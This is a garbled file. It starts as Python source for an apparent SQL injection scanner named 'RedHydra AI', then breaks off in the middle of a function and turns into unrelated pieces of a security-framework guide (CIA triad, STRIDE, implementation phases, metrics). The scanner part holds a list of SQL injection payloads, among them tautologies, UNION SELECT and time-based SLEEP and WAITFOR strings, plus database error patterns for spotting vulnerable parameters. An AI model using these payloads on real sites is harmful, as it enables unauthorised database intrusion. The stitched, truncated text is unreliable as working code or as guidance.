"""RedHydra AI - SQL Injection Scanner"""
import requests, re, sys, time
from urllib.parse import urlparse, parse_qs
from dataclasses import dataclass
from typing import List

@dataclass
class SQLiResult:
    url: str; parameter: str; payload: str; evidence: str; severity: str; sqli_type: str

class SQLiScanner:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url; self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'RedHydra-AI/2.0'})
        self.results: List[SQLiResult] = []
        self.error_patterns = [r"SQL syntax.*?MySQL", r"Warning.*?mysqli?_", r"PostgreSQL.*?ERROR", r"Oracle error", r"SQLite.*Exception", r"SQLSTATE\\[", r"syntax error", r"unclosed quotation"]
        self.payloads = ["'", "''", "\\"", "' OR '1'='1", "' OR '1'='1'--", "' UNION SELECT NULL--", "1 AND 1=1", "1 AND 1=2", "1; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--"]

    def check_errors(self, text: str) -> bool:
        return any(re.search(p, text, re.IGNORECASE) for p in self.error_patterns)

    def test_param(self, url: str, param: str, orig: str) -> List[SQLiResult]:
        results = []
        for payload in self.payloads:
            try:
                parsed = urlparse(url); params = parse_qs(parsed.query)
                params[param] = [orig + payload]
                test_url = parsed._replace(query='&'.join(f'{k}={v[0]}' for k, v in params.items())).geturl()
                start = time.time(); resp = self.session.get(test_url, timeout=self.timeout); elapsed = time.time() - start

### 🔒 Confidentiality
Encryption (AES-256, TLS 1.3), access controls (RBAC), data classification.

### ✅ Integrity
Checksums (SHA-256), digital signatures, audit trails, input validation.

### 🔄 Availability
Redundancy, DDoS protection, disaster recovery, load balancing.

- **T**ampering → Integrity
- **R**epudiation → Non-repudiation
- **I**nformation Disclosure → Confidentiality
- **D**enial of Service → Availability
- **E**levation of Privilege → Authorization

2. Identify threats per component
3. Assess risk (Likelihood × Impact)

The threat landscape has shifted significantly with cloud adoption, remote work, and increasingly sophisticated attack techniques. Organizations must adopt a risk-based approach prioritizing assets and threats specific to their environment.`,sources:["NIST Cybersecurity Framework","CISA Advisory Database","SANS Reading Room"]},{title:"Implementation Framework",content:`Recommended phased approach:

**Phase 1 — Assessment (Weeks 1-4)**
- Current state gap analysis against framework benchmarks
- Risk assessment and threat modeling
- Stakeholder alignment and priority setting

**Phase 2 — Foundation (Months 1-3)**
- Implement core security controls
- Deploy monitoring and detection capabilities
- Establish security baselines and policies

**Phase 3 — Maturity (Months 3-12)**
- Advanced automation and orchestration
- Continuous improvement cycle
- Metrics, reporting, and executive communication
- Regular testing and validation exercises`,sources:["CIS Controls v8","ISO 27001:2022","SANS Implementation Guide"]},{title:"Key Metrics & Measurable Outcomes",content:`Measuring effectiveness:

- **Mean Time to Detect (MTTD)** — Target: <24 hours
- **Mean Time to Respond (MTTR)** — Target: <4 hours
- **Coverage rate** — Percentage of assets under active management
- **Compliance score** — Against framework benchmarks
